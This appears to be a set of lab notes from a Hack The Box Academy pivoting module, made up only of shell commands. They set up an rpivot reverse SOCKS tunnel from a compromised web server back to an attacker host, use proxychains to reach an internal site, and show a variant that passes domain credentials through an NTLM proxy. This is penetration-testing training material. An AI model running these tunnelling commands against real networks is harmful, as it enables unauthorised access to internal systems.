
![](https://academy.hackthebox.com/storage/modules/158/77.png)

```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

```shell-session
AhmaDb0x@htb[/htb]$ sudo apt-get install python2.7
```

```shell-session
AhmaDb0x@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

```shell-session
AhmaDb0x@htb[/htb]$ scp -r rpivot ubuntu@10.129.11.152:/home/ubuntu/
```

---


```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.15.5 --server-port 9999
```

----

```shell-session
proxychains firefox-esr 172.16.5.135:80
```


```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```